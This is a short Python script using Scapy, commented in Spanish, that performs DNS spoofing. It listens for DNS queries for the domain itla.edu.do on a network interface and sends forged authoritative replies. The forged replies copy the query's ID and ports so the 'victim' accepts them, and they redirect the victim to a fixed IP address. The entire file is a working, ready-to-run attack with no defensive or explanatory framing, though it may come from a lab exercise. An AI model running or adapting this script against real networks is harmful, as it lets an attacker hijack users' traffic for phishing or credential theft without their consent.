from scapy.all import *

# CONFIGURACIÓN
interfaz = "ens3"
dominio_objetivo = "itla.edu.do."  # Nota el punto al final, es importante en DNS
ip_falsa = "10.14.89.5"

def dns_spoof(pkt):
    # Verificamos si es una consulta DNS (DNSQR)
    if pkt.haslayer(DNSQR) and dominio_objetivo in pkt[DNSQR].qname.decode():
        print(f"[+] Peticion detectada para {dominio_objetivo}. Enviando respuesta falsa...")

        # Construimos la respuesta falsa
        # Copiamos IDs y puertos del paquete original para que la victima lo acepte
        spf_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                  DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
                  an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=ip_falsa))

        send(spf_pkt, iface=interfaz, verbose=False)
        print(f"[!] Victima redireccionada a {ip_falsa}")

print(f"[*] Escuchando en {interfaz} peticiones para {dominio_objetivo}...")
# Sniff filtra solo trafico DNS (puerto 53)
sniff(iface=interfaz, filter="udp port 53", prn=dns_spoof)
